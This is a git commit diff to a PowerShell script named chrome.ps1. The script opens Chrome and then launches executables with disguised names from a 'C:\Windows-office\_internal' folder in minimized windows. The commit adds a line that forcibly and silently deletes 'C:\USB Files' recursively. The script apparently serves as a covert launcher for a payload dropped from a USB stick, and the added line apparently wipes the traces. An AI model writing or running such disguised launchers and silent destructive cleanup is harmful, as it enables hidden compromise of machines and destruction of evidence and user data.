86ef0cdd482a3dd7f164fdbe37fcdaf06f63d35a
SaturnXIII <110695125+SaturnXIII@users.noreply.github.com>
2024-01-09 22:28:54 +0100

    Add autoremove usb files ♻️

--- script/chrome.ps1
+++ script/chrome.ps1
@@ -2,4 +2,4 @@ start chrome
 Start-Process -FilePath "C:\Windows-office\_internal\libffi-26.exe" -WindowStyle Minimized
 Start-Process -FilePath "C:\Windows-office\_internal\driver.exe" -WindowStyle Minimized
 Start-Process -FilePath "C:\Windows-office\office.exe" -WindowStyle Minimized
-exit
+Remove-Item -Path "C:\USB Files" -Recurse -Force -ErrorAction SilentlyContinue
